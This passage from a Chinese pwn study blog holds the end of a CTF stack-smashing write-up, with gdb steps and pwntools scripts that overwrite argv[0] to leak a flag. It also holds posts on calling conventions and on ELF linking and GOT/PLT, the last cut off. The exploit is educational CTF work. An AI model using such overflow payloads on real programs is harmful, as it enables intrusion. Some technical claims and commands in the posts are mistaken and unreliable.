src="/img/%E7%9C%9F%E7%9A%84%E5%BE%88%E8%8F%9C%E8%8F%9C%E7%9A%84ROP/Snipaste_2023-07-05_17-16-59.png"></p><p>也就是说这道题我们只需要拿flag而不是拿shell，而且v2变量接收第二次输入的字符串，并且会不断覆盖原有的flag内容。</p><p>在这之后还有一条语句</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-built_in">memset</span>((<span class="hljs-type">void</span> *)((<span class="hljs-type">int</span>)v0 + <span class="hljs-number">6294816LL</span>), <span class="hljs-number">0</span>, (<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)(<span class="hljs-number">32</span> - v0));<br></code></pre></td></tr></table></figure><p> 这条伪代码的原型是这样的</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-type">void</span> *<span class="hljs-title">memset</span><span class="hljs-params">(<span class="hljs-type">void</span> *ptr, <span class="hljs-type">int</span> value, <span class="hljs-type">size_t</span> num)</span></span>;<br></code></pre></td></tr></table></figure><p>意思是从内存指针ptr指向的位置直到向后num字节都被value取代。</p><p>结合 <code>byte_600D20[v0++] = v1;</code> ，我们题目中的函数意思就是无论你是否进行第二次输入，在程序结束后 flag 的位置都将被替换，我们就无法通过直接修改 argv[0] 的值获得 flag 。</p><p>但是flag被映射了两次，0x600D21中的flag被修改，那我们就把 argv[0] 指向 0x400d21。</p><p><img src="/img/%E7%9C%9F%E7%9A%84%E5%BE%88%E8%8F%9C%E8%8F%9C%E7%9A%84ROP/Snipaste_2023-07-06_16-02-26.png"></p><blockquote><p>看了很多大佬的解析也没搞明白，程序中有两个load段，为什么第二个load段中的flag，会被映射到第一个load 段里🥲</p></blockquote><p>查找argv[0]的位置，一共找到三种方法：</p><ul><li>方法一：</li></ul><p>用peda挂载文件，先在第一个gets处下断点</p><p><img src="D:/笔记/PWN/ROP/精美配图/Snipaste_2023-07-06_15-37-25.png"></p><p>利用find命令查找与文件名有关的地址，再计算当前的rsp指针与其的距离</p><p><img src="/img/%E7%9C%9F%E7%9A%84%E5%BE%88%E8%8F%9C%E8%8F%9C%E7%9A%84ROP/Snipaste_2023-07-06_15-42-28.png"></p><ul><li>方法二</li></ul><p>也是利用argv[0]指向程序名的特点寻找，直接下断点，查找指向程序名的内存指针。</p><p><img src="/img/%E7%9C%9F%E7%9A%84%E5%BE%88%E8%8F%9C%E8%8F%9C%E7%9A%84ROP/Snipaste_2023-07-06_15-46-20.png"></p><ul><li>方法三</li></ul><p>用命令<code>p &amp; __libc_argv[0]</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs gdb">&gt; p &amp; __libc_argv[0]<br>$1 = (char **) 0x7fffffffdff8<br></code></pre></td></tr></table></figure><p>我们要写入536个字节也就是0x218个字节才能将argv[0]覆盖掉，所以payload构成应该是0x218字节的填充物加上我们目标flag的地址。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>p=process(<span class="hljs-string">&#x27;./readme.bin&#x27;</span>)<br>payload=<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x218</span>+p64(<span class="hljs-number">0x400d20</span>)<br><br>p.recvuntil(<span class="hljs-string">&quot;What&#x27;s your name? &quot;</span>)<br>p.sendline(payload)<br><br>p.recvuntil(<span class="hljs-string">&quot;Please overwrite the flag:&quot;</span>)<br>p.sendline(<span class="hljs-string">&#x27;Modifier&#x27;</span>)<br><br><span class="hljs-built_in">print</span> p.recv()<br></code></pre></td></tr></table></figure><p>但是没有输出，是因为程序把错误信号发送给了执行程序的终端里，我们需要修改环境变量让错误信息通过网络传到我们的终端里。</p><p>所以我们要利用第二次的输入，将 <code>LIBC_FATAL_STDERR_=1</code> 写入到环境变量中。在第一个payload当中我们已经把指针指向了argv[0]，需要将指针再次指向第二次输入点，结果如下：</p><figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs isbl"><span class="hljs-variable">from</span> <span class="hljs-variable">pwn</span> <span class="hljs-variable">import</span> *<br><br><span class="hljs-variable">p</span> = <span class="hljs-function"><span class="hljs-title">process</span>(<span class="hljs-string">&#x27;./readme.bin&#x27;</span>)</span><br><br><span class="hljs-variable">payload_1</span> = <span class="hljs-string">&quot;A&quot;</span>*<span class="hljs-number">0</span><span class="hljs-variable">x218</span> + <span class="hljs-function"><span class="hljs-title">p64</span>(<span class="hljs-number">0</span><span class="hljs-variable">x400d20</span>) + <span class="hljs-title">p64</span>(<span class="hljs-number">0</span>) + <span class="hljs-title">p64</span>(<span class="hljs-number">0</span><span class="hljs-variable">x600d20</span>)</span><br><span class="hljs-variable">p.sendline</span>(<span class="hljs-variable">payload_1</span>)<br><br><span class="hljs-variable">payload_2</span> = <span class="hljs-string">&quot;LIBC_FATAL_STDERR_=1&quot;</span><br><span class="hljs-variable">p.sendline</span>(<span class="hljs-variable">payload_2</span>)<br><br><span class="hljs-variable">print</span> <span class="hljs-variable">p.recvall</span>()<br></code></pre></td></tr></table></figure><hr><p>原来栈溢出不是想象中的辣么简单捏</p><p>栈上的东西终于整理好噜😊</p>]]></content>
    
    
    <categories>
      
      <category>pwn</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Knowledge</tag>
      
      <tag>栈</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>函数调用约定</title>
    <link href="/2023/06/19/%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8%E7%BA%A6%E5%AE%9A/"/>
    <url>/2023/06/19/%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8%E7%BA%A6%E5%AE%9A/</url>
    
    <content type="html"><![CDATA[<p>函数参数怎么传递和由谁清除堆栈</p><span id="more"></span><p>炒冷饭，都快要忘记自己有一个博客了 (x</p><h1 id="什么是函数调用约定"><a href="#什么是函数调用约定" class="headerlink" title="什么是函数调用约定"></a>什么是函数调用约定</h1><p>在函数被调用的过程中，编译器都进行了以下的工作：</p><ol><li><p>把调用者的地址压入栈</p></li><li><p>把函数的参数压入栈或者存储到寄存器当中</p></li><li><p>调转到被引用函数</p></li><li><p>把函数使用的寄存器压入栈</p></li><li><p>执行函数</p></li><li><p>处理函数返回值</p></li><li><p>将第三步中压栈的寄存器恢复到原始值</p></li><li><p>清空第一部中的压栈参数和处理返回地址</p></li><li><p>返回到调用者调用时的地址（即步骤一时记录的地址）</p></li></ol><p>函数调用约定，就是对函数调用的一个约束和规定(规范)，描述了函数参数是怎么传递和由谁清除堆栈的。（堆栈平衡？）</p><blockquote><p>x64的前四个参数使用rcx，rdx，r8，r9传递，之后的参数通过栈来传递</p></blockquote><p>它决定以下三个方面：</p><ul><li>函数参数传递的方式（是否采用寄存器传递函数，采用那个寄存器调用函数，参数压栈顺序等）</li><li>函数调用结束后的栈指针由谁恢复（被调用者恢复或是被调用的函数恢复）</li><li>函数修饰名的产生方法</li></ul><p>我们构造一个函数的时候，会规定返回类型和函数名（参数列表），如：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">funcA</span><span class="hljs-params">()</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">funcB</span><span class="hljs-params">(<span class="hljs-type">int</span> a,<span class="hljs-type">int</span> b)</span>; <br></code></pre></td></tr></table></figure><p>除此之外，还有另外一部分，就是函数的调用约定，由系统自动生成，也可以有我们来手动编写规定，如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> __cdecl <span class="hljs-title function_">funA</span><span class="hljs-params">()</span>;<br><span class="hljs-type">void</span> __stdcall <span class="hljs-title function_">funcB</span><span class="hljs-params">()</span>;<br></code></pre></td></tr></table></figure><h4 id="常见的调用约定"><a href="#常见的调用约定" class="headerlink" title="常见的调用约定"></a>常见的调用约定</h4><ul><li>c：__cdecl 、__stdcall、__fastcall、naked、__pascall</li><li>c++：__cdecl 、__stdcall、__fastcall、naked、__pascall、__thiscall</li></ul><h4 id="调用约定的使用"><a href="#调用约定的使用" class="headerlink" title="调用约定的使用"></a>调用约定的使用</h4><p>调用约定书写在函数的前面，相当于函数类型的一部分。要求函数的声明和定义要有相同的调用约定。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">Add</span><span class="hljs-params">(<span class="hljs-type">int</span> a,<span class="hljs-type">int</span> b)</span>;   <span class="hljs-comment">//默认是__cdecl</span><br><span class="hljs-type">int</span> __stdcall <span class="hljs-title function_">Add</span><span class="hljs-params">(<span class="hljs-type">int</span> a,<span class="hljs-type">int</span> b)</span><br>&#123;<br>    <span class="hljs-keyword">return</span> a+b;<br>&#125;<br></code></pre></td></tr></table></figure><p>以上在编译过程中就会提示出错，因为声明和定义的调用约定不同。正确应该是：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> __stdcall <span class="hljs-title function_">Add</span><span class="hljs-params">(<span class="hljs-type">int</span> a,<span class="hljs-type">int</span> b)</span>;<br><span class="hljs-type">int</span> __stdcall <span class="hljs-title function_">Add</span><span class="hljs-params">(<span class="hljs-type">int</span> a,<span class="hljs-type">int</span> b)</span><br>&#123;<br>    <span class="hljs-keyword">return</span> a+b;<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="不同调用下的规则"><a href="#不同调用下的规则" class="headerlink" title="不同调用下的规则"></a>不同调用下的规则</h1><p>首先我们定义两个概念，即“被调用者”和“调用者”。如下Add()函数就是“被调用者”，ShoowResult()函数就是“调用者”。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">Add</span><span class="hljs-params">(<span class="hljs-type">int</span> a, <span class="hljs-type">int</span> b)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">return</span> a+b;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">ShowResult</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    cout&lt;&lt;<span class="hljs-built_in">add</span>(<span class="hljs-number">5</span>,<span class="hljs-number">10</span>)&lt;&lt;endl;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="cdecl"><a href="#cdecl" class="headerlink" title="__cdecl"></a>__cdecl</h2><p>__cdecl是C Declaration的缩写，表示C\C++默认的函数调用约定</p><h4 id="调用方式"><a href="#调用方式" class="headerlink" title="调用方式"></a>调用方式</h4><ul><li>采用栈传递参数，参数<strong>从右向左</strong>依次入栈</li><li>由调用者恢复栈顶指针</li><li>编译器在编译时会在函数名前加上一个下划线前缀生成修饰名，格式为_function。如Add()的修饰名是_Add()</li></ul><blockquote><p>注意：调用参数个数可变的函数只能采用这种方式</p></blockquote><h2 id="stdcall"><a href="#stdcall" class="headerlink" title="__stdcall"></a>__stdcall</h2><p>__stdcall是Standard Call的缩写，是C++的标准调用方式。</p><h4 id="调用方式-1"><a href="#调用方式-1" class="headerlink" title="调用方式"></a>调用方式</h4><ul><li>采用栈传递参数，参数<strong>从右向左</strong>依次入栈</li><li>由被调用者负责恢复栈顶指针</li><li>在输出函数名前加上一个下划线前缀，后面加一个@符号和其参数的字节数，格式为_function@number。如函数Add的修饰名是_Add@8</li></ul><p>__stdcall与__cdecl最主要的区别是第2条规定：由“被调用者”清空实际上就是把对应参数数目的数据从栈中弹出，这样的缺点就是它不能使用于那些不确定数目参数的函数。</p><p>好处在于只需要在函数内部编译出恢复栈顶的代码，而调用者恢复则需要在调用出编译出恢复栈顶的代码。</p><h2 id="fastcall"><a href="#fastcall" class="headerlink" title="__fastcall"></a>__fastcall</h2><p>__fastcall是快速调用，因为有部分参数可以通过寄存器直接传递，效率比较高。</p><h4 id="调用方式-2"><a href="#调用方式-2" class="headerlink" title="调用方式"></a>调用方式</h4><ul><li>函数的第一个和第二个（<strong>从左向右</strong>）32字节参数（或者尺寸更小的）通过ecx和edx传递（寄存器传递），其他参数通过桟传递。从第三个参数（如果有的话）开始<strong>从右向左</strong>的顺序压栈</li><li>由被调用者恢复栈顶指针</li><li>在函数名前加上@，在函数名后加@和参数字节数，格式为@function@number</li></ul><h2 id="thiscall"><a href="#thiscall" class="headerlink" title="__thiscall"></a>__thiscall</h2><p>__thiscall是唯一一个不能明确指明的函数修饰，因为thiscall只能用于C++类成员函数的调用，同时thiscall也是C++成员函数缺省的调用约定。由于成员函数调用还有一个this指针，因此必须特殊处理。</p><h4 id="调用方式-3"><a href="#调用方式-3" class="headerlink" title="调用方式"></a>调用方式</h4><ul><li>采用栈传递参数，参数<strong>自右向左</strong>入栈</li><li>如果参数的个数确定，this指针通过ecx传递给被调用者；如果参数个数不确定，this指针在所有参数压栈后被压入堆栈</li><li>对于参数个数不确定的由调用者问清理堆栈，否则由被调函数清理。</li></ul>]]></content>
    
    
    <categories>
      
      <category>pwn</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Knowledge</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>动态链接GOT与PLT</title>
    <link href="/2023/04/13/%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5GOT%E4%B8%8EPLT/"/>
    <url>/2023/04/13/%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5GOT%E4%B8%8EPLT/</url>
    
    <content type="html"><![CDATA[<p>主要是动态链接的一些内容</p><span id="more"></span><p>断断续续磨了一个周，本来只是想学一下got表后来发现越挖越深什么都不会，大致了解一下，最后写出了这样一个网络垃圾（x</p><h1 id="预备知识"><a href="#预备知识" class="headerlink" title="预备知识"></a>预备知识</h1><p><strong>链接就是把目标文件与一些库文件生成可执行文件的一个过程。</strong></p><h3 id="编译过程"><a href="#编译过程" class="headerlink" title="编译过程"></a>编译过程</h3><p>要了解“链接”的概念，首先要了解C语言编译生成可执行文件的过程：(1) 预处理；(2) 编译；(3) 汇编；(4) 链接；</p><h5 id="01-预处理"><a href="#01-预处理" class="headerlink" title="01 预处理"></a>01 预处理</h5><p>使用预处理器把源文件<code>test.c</code>经过预处理生成<code>test.i</code>文件，预处理用于将所有的<code>#include</code>头文件以及宏定义替换成其真正的内容，其中<code>test.i</code>是文本文件。</p><p>这里是一个c语言的源文件：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&#x27;This is a test program!\n&#x27;</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>gcc处理命令为：</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmd">gcc -E test.c -o test.i   #-E是让编译器在预处理之后就退出，不进行后续编译过程；-o是指定输出文件名。<br></code></pre></td></tr></table></figure><p>处理后的test.i文件就会变得很长很长，以下是部分截图：</p><p><img src="/img/%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5GOT%E4%B8%8EPLT/Snipaste_2023-04-08_20-09-26.png"></p><h5 id="02-编译"><a href="#02-编译" class="headerlink" title="02 编译"></a>02 编译</h5><p>使用编译器将预处理文件<code>test.i</code>编译成汇编文件<code>test.s</code>，其中<code>test.s</code>是文本文件。</p><p>gcc命令为：</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmd">gcc -S test.i -o test.s   #-S让编译器在编译之后停止，不进行后续过程；-o是指定输出文件名<br></code></pre></td></tr></table></figure><p>处理后的test.s文件又变得短短的了</p><p><img src="/img/%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5GOT%E4%B8%8EPLT/Snipaste_2023-04-08_20-19-27.png"></p><h5 id="03-编译"><a href="#03-编译" class="headerlink" title="03 编译"></a>03 编译</h5><p>使用汇编器将汇编文件<code>test.s</code>转换成目标文件<code>test.o</code>，其中<code>test.o</code>是二进制文件。</p><p>汇编过程的命令为：</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmd">gcc -c test.s -o test.o   #-c让汇编器把汇编文件test.s转换成目标文件test.o。<br></code></pre></td></tr></table></figure><h5 id="04-链接"><a href="#04-链接" class="headerlink" title="04 链接"></a>04 链接</h5><p>链接过程使用链接器将该目标文件与其他目标文件、库文件、启动文件等链接起来生成可执行文件。</p><p>该步骤的命令为：</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmd">gcc test.o test.exe-E <br></code></pre></td></tr></table></figure><p>拖进IDA就是我们比较熟悉的样子了</p><p><img src="/img/%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5GOT%E4%B8%8EPLT/Snipaste_2023-04-08_20-42-21.png"></p><h3 id="动态链接库"><a href="#动态链接库" class="headerlink" title="动态链接库"></a>动态链接库</h3><p>我们在写程序的时候，通常不会完全靠自己来实现所有功能，我们会调用我们所需要的系统库或者第三方库来实现我们的功能，这些库就是动态链接库。</p><blockquote><p>动态链接库可以映射到不同进程的不同虚拟地址，所以属于“地址无关代码”。</p></blockquote><p>🌰：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span>* argv[])</span> &#123;<br>    <span class="hljs-type">char</span> buf[<span class="hljs-number">32</span>];<br>    <span class="hljs-built_in">strncpy</span>(buf, <span class="hljs-string">&quot;Hello, World\n&quot;</span>, <span class="hljs-number">32</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s&quot;</span>,buf);<br>&#125;<br></code></pre></td></tr></table></figure><p>在这段代码中我们调用了系统库，在编译完成后可以查看文件的symbol。会发现在printf和strncpy前面都是没有定义的，这就是用于支持动态连接功能的。</p><blockquote><p>两种命令可以随意挑选，但结果不太一样，还没搞明白😳</p><p><code>nm -g [filename]</code></p><p><code>readelf  -s [filename]</code></p></blockquote><p><img src="/img/%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5GOT%E4%B8%8EPLT/Snipaste_2023-04-10_18-30-06.png"></p><p>通过objdump命令查看相关函数的反汇编模块 <code>objdump -D [filename]</code>（在.plt部分）</p><p><img src="/img/%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5GOT%E4%B8%8EPLT/Snipaste_2023-04-10_21-05-57.png"></p><p>可以看到，程序首先进行jupq操作跳转到相应的代码段，这个代码段就是用于给“地址无关代码”做动态地址重定位，链接器将这个函数的调用代码跳转到程序运行时的动态装载地址。</p><h3 id="链接器"><a href="#链接器" class="headerlink" title="链接器"></a>链接器</h3><p>链接器（Linker）是一个程序，将一个或多个由编译器或汇编器生成的目标文件外加库链接为一个可执行文件。目标文件是包括机器码和链接器可用信息的程序模块。</p><p>简单的讲，<strong>链接器的工作就是解析未定义的符号引用，将目标文件中的占位符替换为符号的地址</strong>。</p><p>链接器还要完成程序中各目标文件的地址空间的组织，涉及重定位工作。</p><h5 id="链接器的工作步骤"><a href="#链接器的工作步骤" class="headerlink" title="链接器的工作步骤"></a>链接器的工作步骤</h5><ul><li>将代码和数据模块象征性地放入内存</li><li>决定数据和指令标签的地址</li><li>修补内部和外部引用</li></ul><h5 id="链接器需要对动态链接库做的情"><a href="#链接器需要对动态链接库做的情" class="headerlink" title="链接器需要对动态链接库做的情"></a>链接器需要对动态链接库做的情</h5><ul><li>链接库在将目标文件链接成可执行文件的的时候，如果发现某一个变量或者函数在目标中找不到，就会按照 gcc 预定义的动态库寻找动态库中定义的变量或者函数</li><li>如果链接库在某一动态库中找到了该变量或者函数的定义，链接库首先会把这个动态链接库写到可执行文件的依赖库中，然后生成这个当前变量或者函数的代理symbol</li><li>在偏移表中生成真正的动态跳转指令，并且在库函数代理symbol中跳转到相应的偏移位置</li></ul><h3 id="重定位"><a href="#重定位" class="headerlink" title="重定位"></a>重定位</h3><p>重定位（Relocations）就是把程序的逻辑地址变换成为内存中的实际地址空间的过程。</p><p>重定位分为两步：</p><ul><li>重定位节和符号引用</li></ul><p>在这一步中，连接器将所有相同类型的节合并为同一类型的新聚节。随后链接器把运行时的内存赋值给新的聚合节，赋给输入模块定义的每个节，以及赋给输入模块的每个符号。</p><blockquote><p>e.g.所有输入模块的.data节被合并为一个节，这个节成为输入的可执行目标文件的.data节。</p></blockquote><p>当这一步完成，程序中的每条指令和全局变量都有唯一的运行时的内存地址了。</p><ul><li>重定位节中的符号引用</li></ul><p>在这一步中，链接器修改代码节和数据节中对每个符号的引用，使得他们指向正确的运行地址。</p><p>其中，链接器执行这一步需要依靠可重定位目标模块中成为<strong>重定位条目</strong>的数据结构。</p><h5 id="重定位条目"><a href="#重定位条目" class="headerlink" title="重定位条目"></a>重定位条目</h5><p>当汇编器生成一个目标模块时，他并不知道数据和代码最终会被放在内存的那个位置，也不知道这个模块引用的外部定义的函数或者全局变量的位置。所以，当汇编器遇到一个对最终位置未知的目标引用，它就会生成一个重定位条目，告诉连接器将目标文件合并成可执行文件时如何修改这个引用。</p><p>代码的重定位条目放在<code>.rel.text</code>中，已经初始化数据的重定位条目放在<code>.rel.data</code>中。</p><p>重定位条目分为两种格式：<code>Rel</code>和<code>Rela</code>。每个重定位条目表示一个必须被重定位的符号引用，并指明如何计算被修改的符号引用。</p><blockquote><p>重定位条目<code>Rel</code>和<code>Rela</code>之间的唯一区别：<code>Rel</code>中没有<code>Addend</code>字段。</p></blockquote><p>查看文件中的重定位信息：</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmd">readelf -r [filename]<br></code></pre></td></tr></table></figure><p><img src="/img/%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5GOT%E4%B8%8EPLT/Snipaste_2023-04-12_21-32-29.png"></p><ul><li><p><code>Offset</code>是 Relocation Entry 结构体中的第 1 个字段，占用 8 字节，表示<strong>需要修改的符号引用的位置</strong>。</p><ul><li><p>对于可重定位目标文件，该字段表示需要修改的符号引用的起始位置在目标 section （<code>.rela.text</code>中的重定位条目对应的目标 section 为<code>.text</code>，<code>.rela.data</code>中的重定位条目对应的目标 section 为<code>.data</code>，以此类推）中的偏移量（字节）。</p></li><li><p>对于可执行目标文件和可共享目标文件，该字段表示需要修改的符号引用的起始位置所对应的虚拟内存地址。</p></li></ul></li><li><p><code>Info</code>是 Relocation Entry 结构体中的第 2 个字段，占用 8 字节，表示<strong>符号表索引和重定位类型</strong>（符号表索引占用高 32 位，重定位类型占用低 32 位）。</p><ul><li><p>符号表索引表示需要修改的符号引用在<code>.symtab</code>section中的索引。这里的<code>Sym. Value</code>和<code>Sym. Name</code>列只是打印了所对应符号表条目中<code>Value</code>和<code>Name</code>列的值。</p></li><li><p>重定位类型指示链接器如何修改该符号引用的值。重定位类型因不同的处理器而异。</p></li></ul></li><li><p><code>Addend</code>是 Relocation Entry 结构体中的第 3 个字段，占用 8 字节，表示一个有符号常数，一些重定位类型要使用它对被修改符号引用的值做<strong>偏移调整</strong>。</p></li></ul><h1 id="静态链接和动态链接"><a href="#静态链接和动态链接" class="headerlink" title="静态链接和动态链接"></a>静态链接和动态链接</h1><h4 id="静态链接"><a href="#静态链接" class="headerlink" title="静态链接"></a>静态链接</h4><blockquote><p>静态链接是由链接器在链接时将库的内容加入到可执行程序中的做法。链接器是一个独立程序，将一个或多个库或目标文件（先前由编译器或汇编器生成链接到一块生成可执行程序。这里的库指的是静态链接库，Windows下以<code>.lib</code>为后缀，Linux下以<code>.a</code>为后缀。</p></blockquote><p>若程序使用静态链接方式，则程序所有代码都将集成到同一个二进制文件中，其优点在于无依赖关系，可以在不同运行环境的OS下运行。</p><p>但是缺点也十分明显，由于二进制文件中包含全部代码，所以所占空间较大；如果多次运行同一个程序，则OS可能会对某个库函数进行多次重复 的加载，占用了不必要的内存；若某个公用的库函数产生了更新，则需要重新编译所有使用了该库的程序，工作量较大。</p><h5 id="优点"><a href="#优点" class="headerlink" title="优点"></a>优点</h5><ul><li>代码装载速度快，执行速度略比动态链接库快；</li><li>只需保证在开发者的计算机中有正确的.lib文件，在以二进制形式发布程序时不需考虑在用户的计算机上.lib文件是否存在及版本问题。</li></ul><h5 id="缺点"><a href="#缺点" class="headerlink" title="缺点"></a>缺点</h5><ul><li>使用静态链接生成的可执行文件体积较大，包含一些重复相同的代码，造成内存空间的浪费。</li></ul><h4 id="动态链接"><a href="#动态链接" class="headerlink" title="动态链接"></a>动态链接</h4><p>动态链接（Dynamic Linking），把链接这个过程推迟到了运行时再进行，在可执行文件装载时或运行时，由操作系统的装载程序加载库。这里的库指的是动态链接库，Windows下以<code>.dll</code>为后缀，Linux下以<code>.so</code>为后缀。</p><p>在Windows下的动态链接也可以用到.lib为后缀的文件，但这里的<code>.lib</code>文件叫做导入库，是由<code>.dll</code>文件生成的。</p><h5 id="优点-1"><a href="#优点-1" class="headerlink" title="优点"></a>优点</h5><ul><li><p>生成的可执行文件较小；</p></li><li><p>适用于大规模的软件开发，使开发过程相对独立，耦合度减小，便于不同的开发者和开发组织之间进行开发和测试；</p></li><li><p>不同编程语言编写的程序只要按照函数调用约定就可以调用同一个DLL函数；</p></li><li><p>DLL文件与EXE文件独立，只要输出接口不变（即名称、参数、返回值类型和调用约定不变），更换DLL文件不会对EXE文件造成任何影响，因而极大地提高了可维护性和可扩展性</p></li></ul><h5 id="缺点-1"><a href="#缺点-1" class="headerlink" title="缺点"></a>缺点</h5><ul><li>使用动态链接库的应用程序不是自完备的，它依赖的DLL模块也要存在，如果使用载入时动态链接，程序启动时发现DLL不存在，系统将终止程序并给出错误信息；</li><li>速度比静态链接慢</li></ul><h1 id="GOT与PLT"><a href="#GOT与PLT" class="headerlink" title="GOT与PLT"></a>GOT与PLT</h1><p>为了支持动态链接这一工作过程，在<code>.elf</code>文件中有四个section与之相关：</p><ul><li><code>.got</code> ：全局偏移表（Global Offset Table），用于存储外部符号的绝对地址即运行时符号的真实地址，由链接器进行填充，包含动态链接的函数的地址。</li><li><code>.plt</code>：过程链接表（Procedure Linkage Table），就是一小段跳转指令，存有从<code>.got.plt</code>中查找外部函数地址的代码，若是第一次调用该函数，则会触发链接器解析函数地址并填充在<code>.got.plt</code>相应的位置；若函数地址已经存储在<code>.got.plt</code>中则直接跳转到对应地址继续执行。</li><li><code>.got.plt</code>：是plt的got。它包含返回.plt去触发查找的地址，或者是一个经过查找后填充的正确符号地址。</li><li><code>.plt.got</code>：不知道干啥用的……</li></ul><h3 id="延迟绑定"><a href="#延迟绑定" class="headerlink" title="延迟绑定"></a>延迟绑定</h3><p>因为静态链接中的重定位工作全部在运行时完成，且当我们引用了某一个库，程序将会对其中的所有函数和全局变量进行重定位，这种情况下，链接的动态库越大链接的时间就越长，系统的启动时间就越长。</p><p>为了解决这一问题，延迟绑定的概念被提出。延迟绑定规定只有符号真正被引用时才会进行重定位，而不是在刚开始就对所有的动态符号进行重定位。</p><p>延迟绑定由plt来实现，在elf文件中，plt表和got表几乎时时刻刻伴随着<del>（这是可以嗑的吗是可以的吗）</del>。</p><p>在got表中，前三项内容不对应符号的引用，分别对应：</p><ul><li>got[0]：当前的elf文件中.synamic段的地址</li><li>got[1]：保留</li><li>got[2]：动态链接器的符号解析函数</li></ul><p>其余的项被用作符号重定位，对于外部函数(即外部跳转)的 got 